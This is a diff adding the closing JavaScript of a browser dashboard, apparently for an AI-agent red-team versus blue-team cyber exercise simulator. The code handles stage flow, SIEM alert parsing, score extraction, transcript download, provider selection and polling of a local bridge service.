+        bOut=await callDemo(activeDemoStages[i].b);
+        await twEl(document.getElementById(`b-s${i}`),bOut);
+      }else{
+        const bEl=document.getElementById(`b-s${i}`);
+        bOut=await callWithRecovery(`BLUE ${st.bLabel}`,
+          opts=>streamPhase(bEl,bSysPrompt,budget(`Respond to red team ${st.rLabel} activity now.`,600),ak,opts),bEl);
+      }
+      bState=bOut;
+      bTermHistory+=`\n\n[${st.bLabel}]\n${bOut}`;
+
+      // Parse alerts from blue response
+      const alertMatches=bOut.matchAll(/\[([^\]]+)\]\s*\|\s*SEVERITY:\s*(HIGH|MED|LOW|CRITICAL|INFO)\s*\|\s*RULE:\s*([^\|]+)\|[^\|]*\|\s*DESC:\s*([^\n]+)/gi);
+      for(const m of alertMatches){
+        addSiem(m[1]||ts(),m[2]||sevCycle[i],m[3]?.trim()||st.bLabel,`RED-OPS`,m[4]?.trim()||`${st.rLabel} detected`);
+      }
+      if(siemCount===0||i>=1){
+        addSiem(ts(),sevCycle[i],st.bLabel,'RED-OPS-1',`${st.rLabel} activity detected — ${st.bLabel} response initiated`);
+      }
+      await sleep(600);
+      // Step gate between stages
+      const nextLabel=i<activeStages.length-1?`${activeStages[i+1].rLabel} → ${activeStages[i+1].bLabel}`:'HARDEN — Post-Exercise Report';
+      await waitCombatPhase(nextLabel);
+    }
+
+    // Final: Blue hardens
+    setRP(6);setBP(7);
+    bT(`<div class="te"><div class="te-hdr">⚡ HARDEN — POST-EXERCISE REPORT</div><div class="te-body" id="b-final">...</div></div>`);
+    let finalRpt;
+    if(combatDemo){
+      const hardenKey=currentScenario==='phantom'?CDEMO_PHANTOM_HARDEN
+                    :evolvedAgent?'HARDEN_EVOLVED':'HARDEN';
+      finalRpt=await callDemo(hardenKey);
+      await twEl(document.getElementById('b-final'),finalRpt);
+    }else{
+      const hardenSys=currentScenario==='phantom'?SYS_PHANTOM_BLUE_HARDEN(networkState,bTermHistory):SYS_BLUE_HARDEN(networkState,bTermHistory);
+      const hEl=document.getElementById('b-final');
+      finalRpt=await callWithRecovery('HARDEN',
+        opts=>streamPhase(hEl,hardenSys,budget('Produce the post-exercise hardening report.',1200),ak,opts),hEl);
+    }
+    document.getElementById('b-term').scrollTop=1e9;
+
+    // Extract final verdict
+    const rd=finalRpt.match(/RED TEAM SCORE:\s*([0-9]+\/10)/i);
+    const bd=finalRpt.match(/BLUE TEAM SCORE:\s*([0-9]+\/10)/i);
+    const vd=finalRpt.match(/VERDICT:\s*(RED WIN|BLUE WIN|DRAW)/i);
+    if(rd||bd||vd){
+      rT(`<div class="te-crit">EXERCISE COMPLETE — RED ${rd?rd[1]:'?/10'}</div>`);
+      bT(`<div class="te-crit">EXERCISE COMPLETE — BLUE ${bd?bd[1]:'?/10'} — ${vd?vd[1]:'SEE REPORT'}</div>`);
+    }
+    addSiem(ts(),'INFO','EXERCISE','SWARM',`Exercise complete. ${vd?vd[1]:'See report.'}`);
+
+    // Stash final state for transcript download
+    combatFinalRpt=finalRpt;
+    combatFinalScores={red:rd?rd[1]:null,blue:bd?bd[1]:null,verdict:vd?vd[1]:null};
+    document.getElementById('dl-transcript-btn').style.display='';
+
+    // Export exercise state for evolve demo (bidirectional improvement loop)
+    try{
+      const parseScore=m=>m?parseInt(m[1].split('/')[0],10):null;
+      const stageOutcomes=activeStages.map((st,idx)=>{
+        const bTxt=(document.getElementById(`b-s${idx}`)?.textContent||'').toLowerCase();
+        const passed=bTxt.includes('threat confirmed')||bTxt.includes('rule triggered')||bTxt.includes('detection:');
+        const failed=bTxt.includes('no anomal')||bTxt.includes('no detection')||bTxt.includes('failed');
+        return{stage:`${st.rLabel}/${st.bLabel}`,red_outcome:'PASS',
+          blue_outcome:passed&&!failed?'PASS':failed?'FAIL':'PARTIAL'};
+      });
+      localStorage.setItem('swarmdemo_loop_source',JSON.stringify({
+        version:1,timestamp:new Date().toISOString(),
+        exercise_name:currentScenario==='phantom'?'OPERATION PHANTOM FEED':'OPERATION IRONCLAD',domain:'red_vs_blue',
+        network_summary:networkState.slice(0,800),
+        red_score:parseScore(rd)||8,blue_score:parseScore(bd)||7,
+        verdict:(vd&&vd[1])||'SEE REPORT',stage_results:stageOutcomes,
+        blue_agents:[
+          {name:'TELEMETRY-ANALYST',role:'Log ingestion and first-pass anomaly detection'},
+          {name:'DETECTION-ENGINEER',role:'Sigma rule authoring and threat correlation'},
+          {name:'INCIDENT-COMMANDER',role:'Incident response coordination'},
+          {name:'FORENSIC-COLLECTOR',role:'Digital evidence acquisition'},
+          {name:'THREAT-HUNTER',role:'Proactive threat hunting'}
+        ],
+        blue_transcript_excerpt:bTermHistory.slice(0,2000),
+        red_transcript_excerpt:rTermHistory.slice(0,1000),
+        demo_mode:combatDemo
+      }));
+    }catch(_){}
+
+    clearInterval(timerI);
+    document.getElementById('r-stat').textContent='COMPLETE';document.getElementById('r-stat').className='pstat';
+    document.getElementById('b-stat').textContent='COMPLETE';document.getElementById('b-stat').className='pstat';
+    document.getElementById('binfo').innerHTML='Exercise complete. See post-exercise hardening report in blue pane. &nbsp;<a href="improvement-loop-live.html" style="color:var(--grn);font-family:\'Share Tech Mono\',monospace;font-size:10px;letter-spacing:1px;text-decoration:none;border:1px solid var(--grn);padding:3px 9px;white-space:nowrap">[ OPEN IN LOOP DEMO ]</a>';
+
+  }catch(err){
+    rT(`<div class="ts" style="color:var(--red)">EXERCISE FAULT: ${safeErrText(err.message)}</div>`);
+    showErrorRecovery();
+    clearInterval(timerI);
+    running=false;
+    document.getElementById('engage-btn').disabled=false;
+    document.getElementById('engage-btn').textContent='[ ⚛ ENGAGE ]';
+  }
+}
+
+function resetCombat(){
+  clearInterval(timerI);elapsed=0;running=false;siemCount=0;
+  document.getElementById('timer').textContent='00:00';
+  document.getElementById('r-term').innerHTML='<div class="ts">Reset. Awaiting ENGAGE command.</div>';
+  document.getElementById('b-term').innerHTML='<div class="ts">Reset. Awaiting ENGAGE command.</div>';
+  document.getElementById('siem-body').innerHTML='<div class="srow"><span class="st">—</span><span class="ss info">WAITING</span><span class="sd">No alerts.</span><span class="sa">—</span></div>';
+  setRP(0);setBP(0);
+  document.getElementById('r-stat').textContent='STANDBY';document.getElementById('r-stat').className='pstat';
+  document.getElementById('b-stat').textContent='STANDBY';document.getElementById('b-stat').className='pstat';
+  document.getElementById('engage-btn').disabled=true;document.getElementById('engage-btn').textContent='[ ⚛ ENGAGE ]';
+  document.getElementById('setup-btn').disabled=false;document.getElementById('setup-btn').textContent='[ SETUP NETWORK ]';
+  document.getElementById('binfo').textContent='Setup vulnerable network, then engage to begin the exercise.';
+  networkState='';rTermHistory='';bTermHistory='';siemAlerts=[];
+  combatFinalRpt='';combatFinalScores={red:null,blue:null,verdict:null};
+  document.getElementById('dl-transcript-btn').style.display='none';
+  // Keep evolved agent loaded across reset — re-run tests the improvement
+}
+
+function dlCombatTranscript(){
+  if(!combatFinalRpt){return;}
+  const ts=new Date().toISOString();
+  const scen=currentScenario==='phantom'?'OPERATION PHANTOM FEED':'OPERATION IRONCLAD';
+  const evolvedNote=evolvedAgent?` (EVOLVED ${evolvedAgent.name} loaded)`:'';
+  const siemRows=[...document.querySelectorAll('#siem-body .srow')].map(r=>{
+    const t=r.querySelector('.st')?.textContent||'';
+    const s=r.querySelector('.ss')?.textContent||'';
+    const d=r.querySelector('.sd')?.textContent||'';
+    const a=r.querySelector('.sa')?.textContent||'';
+    return `${t} | ${s} | ${a} | ${d}`;
+  }).filter(l=>!l.includes('No alerts')).join('\n');
+  const pkg=[
+    `<!-- SWARM CAGE — EXERCISE TRANSCRIPT v3.0`,
+    `  Generated: ${ts}`,
+    `  Scenario: ${scen}${evolvedNote}`,
+    `  Red Score: ${combatFinalScores.red||'?/10'} | Blue Score: ${combatFinalScores.blue||'?/10'} | Verdict: ${combatFinalScores.verdict||'SEE REPORT'}`,
+    `  Mode: ${combatDemo?'DEMO':'LIVE'} | Provider: ${combatProvider||'anthropic'}`,
+    `-->`,``,
+    `# CAGE EXERCISE TRANSCRIPT — ${scen}`,``,
+    `**Generated:** ${ts}  `,
+    `**Mode:** ${combatDemo?'DEMO':'LIVE'}  `,
+    `**Final Score:** Red ${combatFinalScores.red||'?/10'} / Blue ${combatFinalScores.blue||'?/10'}  `,
+    `**Verdict:** ${combatFinalScores.verdict||'SEE REPORT'}  `,
+    evolvedAgent?`**Evolved Agent Loaded:** ${evolvedAgent.name} (iter ${evolvedAgent.iteration||'?'})  `:'',
+    ``,`---`,``,
+    `## NETWORK SETUP`,``,(networkState||'(no setup capture)').trim(),``,`---`,``,
+    `## RED TEAM TRANSCRIPT`,``,(rTermHistory||'(no transcript)').trim(),``,`---`,``,
+    `## BLUE TEAM TRANSCRIPT`,``,(bTermHistory||'(no transcript)').trim(),``,`---`,``,
+    `## SIEM ALERTS`,``,siemRows||'(no alerts captured)',``,`---`,``,
+    `# POST-EXERCISE HARDENING REPORT`,``,combatFinalRpt
+  ].filter(Boolean).join('\n');
+  const fn=`cage-${currentScenario}-${Date.now()}.md`;
+  const b=new Blob([pkg],{type:'text/markdown;charset=utf-8'});
+  const u=URL.createObjectURL(b);const a=document.createElement('a');
+  a.href=u;a.download=fn;a.click();URL.revokeObjectURL(u);
+  const btn=document.getElementById('dl-transcript-btn');
+  const orig=btn.textContent;btn.textContent='[ ⬇ DOWNLOADED ✓ ]';
+  setTimeout(()=>btn.textContent=orig,2000);
+}
+
+function tick2(){document.getElementById('ts2').textContent=new Date().toISOString().replace('T',' ').slice(0,19)+' UTC'}
+tick2();setInterval(tick2,1000);
+
+function setCombatProvider(p,init){
+  combatProvider=p;
+  if(!init)localStorage.setItem('swarmdemo_provider',p);
+  document.getElementById('cprv-ant').classList.toggle('sel',p==='anthropic');
+  document.getElementById('cprv-cc').classList.toggle('sel',p==='cc');
+  document.getElementById('cprv-ollama').classList.toggle('sel',p==='ollama');
+  const ollamaMdl=document.getElementById('c-ollama-model');
+  const cak=document.getElementById('cak');
+  const ollamaNote=document.getElementById('collama-note');
+  if(p==='cc'){
+    if(ollamaMdl)ollamaMdl.style.display='none';
+    if(cak){cak.style.display='none';}
+    document.getElementById('cak-conf').style.display='none';
+    if(ollamaNote)ollamaNote.style.display='none';
+  }else if(p==='ollama'){
+    if(ollamaMdl){ollamaMdl.style.display='inline-block';const saved=localStorage.getItem('swarmdemo_ollama_model');if(saved)ollamaMdl.value=saved;}
+    if(cak)cak.style.display='none';
+    document.getElementById('cak-conf').style.display='none';
+    if(ollamaNote)ollamaNote.style.display='';
+  }else{
+    if(ollamaMdl)ollamaMdl.style.display='none';
+    if(ollamaNote)ollamaNote.style.display='none';
+    if(cak)cak.placeholder='Anthropic API Key (sk-ant-...)';
+    const ak=localStorage.getItem('swarmdemo_cage_key');
+    if(ak){cak.value=ak;cak.style.display='none';document.getElementById('cak-conf').style.display='block';}
+    else{cak.value='';cak.style.display='';document.getElementById('cak-conf').style.display='none';}
+  }
+}
+function clearCombatKey(){
+  localStorage.removeItem('swarmdemo_cage_key');
+  const cak=document.getElementById('cak');
+  cak.value='';cak.style.display='';
+  document.getElementById('cak-conf').style.display='none';
+}
+setCombatProvider(combatProvider,true);
+document.getElementById('cak').addEventListener('input',e=>{
+  localStorage.setItem('swarmdemo_cage_key',e.target.value);
+});
+document.getElementById('c-ollama-model')?.addEventListener('input',e=>{
+  localStorage.setItem('swarmdemo_ollama_model',e.target.value);
+});
+
+// ─── Evolve demo bidirectional import ───
+let _evolveData=null;
+function checkEvolveExport(){
+  try{
+    const raw=localStorage.getItem('swarmdemo_loop_export');
+    if(!raw)return;
+    const data=JSON.parse(raw);
+    if(data.version!==1||!data.refined_agent?.name||!data.refined_agent?.refined_prompt)return;
+    _evolveData=data;
+    const banner=document.getElementById('evolve-banner');
+    const text=document.getElementById('evolve-banner-text');
+    if(banner&&text){
+      text.textContent=`${data.refined_agent.name} has been refined (iteration ${data.iteration||1}). Load into next exercise?`;
+      banner.style.display='flex';
+    }
+  }catch(_){}
+}
+checkEvolveExport();
+window.addEventListener('storage', function(e){ if(e.key==='swarmdemo_loop_export'&&e.newValue) checkEvolveExport(); });
+function loadEvolvedAgent(){
+  if(!_evolveData)return;
+  evolvedAgent=_evolveData.refined_agent;
+  const normEvolved=evolvedAgent.name.toUpperCase().replace(/[\s_-]+/g,'-');
+  const matched=typeof blueAgentNames!=='undefined'&&blueAgentNames.some(n=>n.toUpperCase().replace(/[\s_-]+/g,'-')===normEvolved);
+  if(!matched&&typeof blueAgentNames!=='undefined'){const w='⚠ Evolved agent name "'+evolvedAgent.name+'" did not match any blue team agent — check evolve output. Evolved prompt will not be injected.';document.getElementById('binfo').textContent=w;console.warn('[swarm-cage]',w);}
+  const banner=document.getElementById('evolve-banner');
+  if(banner)banner.style.display='none';
+  const badge=document.getElementById('evolve-badge');
+  if(badge){badge.textContent=`EVOLVED: ${evolvedAgent.name}`;badge.style.display='';}
+  document.getElementById('binfo').textContent=`Evolved ${evolvedAgent.name} loaded. Run SETUP NETWORK and ENGAGE to test the improvement.`;
+}
+function dismissEvolveBanner(){
+  const banner=document.getElementById('evolve-banner');
+  if(banner)banner.style.display='none';
+}
+
+// ============================================================================
+// LIVE MODE — polls the local visualization bridge helper
+// instead of calling the Anthropic API for narrative generation.
+// Start the bridge helper before enabling LIVE MODE.
+// ============================================================================
+
+const BRIDGE_URL='http://localhost:7700';
+let liveMode=false, livePollI=null, bridgeOk=false;
+
+function setBridgeDot(ok){
+  const d=document.getElementById('bridge-dot');
+  d.className='bridge-dot '+(ok?'ok':'err');
+  bridgeOk=ok;
+}
+
+async function probeBridge(){
+  try{
+    const r=await fetch(BRIDGE_URL+'/health',{signal:AbortSignal.timeout(2000)});
+    if(r.ok){setBridgeDot(true);return true;}
+  }catch(_){}
+  setBridgeDot(false);return false;
+}
+
+function toggleLiveMode(){
+  liveMode=!liveMode;
+  const btn=document.getElementById('live-toggle-btn');
+  btn.classList.toggle('active',liveMode);
+  if(liveMode){
+    startLivePoll();
+    document.getElementById('binfo').textContent='LIVE MODE — polling bridge at '+BRIDGE_URL;
+  }else{
+    stopLivePoll();
+    setBridgeDot(false);
+    document.getElementById('binfo').textContent='Setup vulnerable network, then engage to begin the exercise.';
+  }
+}
+
+function startLivePoll(){
+  probeBridge().then(ok=>{
+    if(!ok){
+      bT(`<div class="ts" style="color:var(--amb)">LIVE MODE: Bridge offline at ${BRIDGE_URL} — start the bridge helper first</div>`);
+    }
+  });
+  // Poll /state every 2s
+  livePollI=setInterval(async()=>{
+    try{
+      const [sR,nR,redR,blR,scR]=await Promise.all([
+        fetch(BRIDGE_URL+'/state',{signal:AbortSignal.timeout(2000)}),
+        fetch(BRIDGE_URL+'/roles/network',{signal:AbortSignal.timeout(2000)}),
+        fetch(BRIDGE_URL+'/roles/red',{signal:AbortSignal.timeout(2000)}),
+        fetch(BRIDGE_URL+'/roles/blue',{signal:AbortSignal.timeout(2000)}),
+        fetch(BRIDGE_URL+'/scores',{signal:AbortSignal.timeout(2000)}),
+      ]);
+      if(!sR.ok)throw new Error('state '+sR.status);
+      setBridgeDot(true);
+      const [st,net,red,blu,sc]=await Promise.all([sR.json(),nR.json(),redR.json(),blR.json(),scR.json()]);
+      applyLiveState(st,net,red,blu,sc);
+    }catch(e){
+      setBridgeDot(false);
+    }
+  },2000);
+}
+
+function stopLivePoll(){
+  if(livePollI){clearInterval(livePollI);livePollI=null;}
+}
+
+function phaseFromState(s){
+  const m={NOT_STARTED:0,READY:0,RUNNING:1,PAUSED:1,COMPLETE:6,FAILED:6};
+  return m[s]??0;
+}
+
+let _lastLiveExId='', _lastLiveState='';
+function applyLiveState(st,net,red,blu,sc){
+  const exId=st.exercise_id||'';
+  const exState=st.state||'NOT_STARTED';
+  const mode=st.execution_mode||'';
+  const elapsed=st.elapsed_seconds||0;
+
+  // Update timer
+  if(elapsed>0){
+    const m=Math.floor(elapsed/60).toString().padStart(2,'0');
+    const s=(elapsed%60).toString().padStart(2,'0');
+    document.getElementById('timer').textContent=m+':'+s;
+  }
+
+  // Update phase indicators from role states
+  const rState=red.state||'NOT_STARTED';
+  const bState=blu.state||'NOT_STARTED';
+  if(rState==='RUNNING'||rState==='COMPLETE') setRP(phaseFromState(rState));
+  if(bState==='RUNNING'||bState==='COMPLETE') setBP(phaseFromState(bState));
+
+  // Update status labels
+  const rStat=document.getElementById('r-stat');
+  const bStat=document.getElementById('b-stat');
+  const stateToLabel={RUNNING:'ATTACKING',READY:'READY',PAUSED:'PAUSED',COMPLETE:'COMPLETE',FAILED:'FAILED',NOT_STARTED:'STANDBY'};
+  if(rStat){rStat.textContent=stateToLabel[rState]||rState;rStat.className='pstat'+(rState==='RUNNING'?' active-r':'');}
+  if(bStat){bStat.textContent=stateToLabel[bState]||bState;bStat.className='pstat'+(bState==='RUNNING'?' active-b':'');}
+
+  // Log state changes to terminals (once per transition)
+  const stateKey=exId+exState;
+  if(stateKey!==_lastLiveState){
+    _lastLiveState=stateKey;
+    if(exId&&exId!=='[not assigned]'){
+      const modeTag=mode==='OBSERVE'?' [OBSERVE-MODE]':'';
+      rT(`<div class="ts">BRIDGE: ex=${exId} | network=${net.swarm_id||'?'} | red=${red.swarm_id||'?'}${modeTag}</div>`);
+      bT(`<div class="ts">BRIDGE: ex=${exId} | blue=${blu.swarm_id||'?'} | state=${exState}${modeTag}</div>`);
+    }
+  }
+
+  // Log new role summary entries (detect changes via summary content)
+  const redSum=red.summary||{};
+  if(redSum['Highest Phase Reached']&&redSum['Highest Phase Reached']!=='undefined'){
+    // Only add terminal entry if content changed
+    const redKey=JSON.stringify(redSum);
+    if(redKey!==rT._lastKey){
+      rT._lastKey=redKey;
+      const lines=Object.entries(redSum).map(([k,v])=>`${k}: ${v}`).join('\n');
+      rT(`<div class="te"><div class="te-hdr">▶ RED TEAM STATUS [LIVE]</div><div class="te-body">${lines}</div></div>`);
+    }
+  }
+
+  const bluSum=blu.summary||{};
+  if(bluSum['Session State']||bluSum['Detection Events']){
+    const bluKey=JSON.stringify(bluSum);
+    if(bluKey!==bT._lastKey){
+      bT._lastKey=bluKey;
+      const lines=Object.entries(bluSum).map(([k,v])=>`${k}: ${v}`).join('\n');
+      bT(`<div class="te"><div class="te-hdr">⚡ BLUE TEAM STATUS [LIVE]</div><div class="te-body">${lines}</div></div>`);
+    }
+  }
+
+  // Update SIEM with live score data
+  const totals=sc.totals||{};
+  const sRow=`Red claimed: ${totals.red_claimed||0} | Blue detections: ${totals.blue_detections||0} | Containments: ${totals.blue_containments||0}`;
+  if(sRow!==applyLiveState._lastScoreRow){
+    applyLiveState._lastScoreRow=sRow;
+    addSiem(ts(),'INFO','LIVE-BRIDGE','SCORES',sRow);
+  }
+
+  // Update binfo
+  const netSum=net.summary||{};
+  const upCount=netSum['Targets Up']||'?';
+  document.getElementById('binfo').textContent=`LIVE MODE — ex: ${exId||'—'} | state: ${exState} | targets up: ${upCount} | red: ${rState} | blue: ${bState}`;
+}
+
+applyLiveState._lastScoreRow='';
+rT._lastKey='';
+bT._lastKey='';
+
+// A7: Space bar advances STEP MODE gate
+document.addEventListener('keydown',function(e){if(e.code==='Space'&&e.target.tagName!=='INPUT'&&e.target.tagName!=='TEXTAREA'){const gates=document.querySelectorAll('.step-btn:not([style*="display:none"])');if(gates.length){e.preventDefault();gates[0].click();}}});
+// A8: Ctrl+D toggles DEMO MODE
+document.addEventListener('keydown',function(e){if(e.ctrlKey&&e.key==='d'){e.preventDefault();toggleCombatDemo();}});
+document.addEventListener('keydown',function(e){if(e.ctrlKey&&e.key==='p'){e.preventDefault();document.body.classList.toggle('pmode');}});
+</script>
+</body>
+</html>
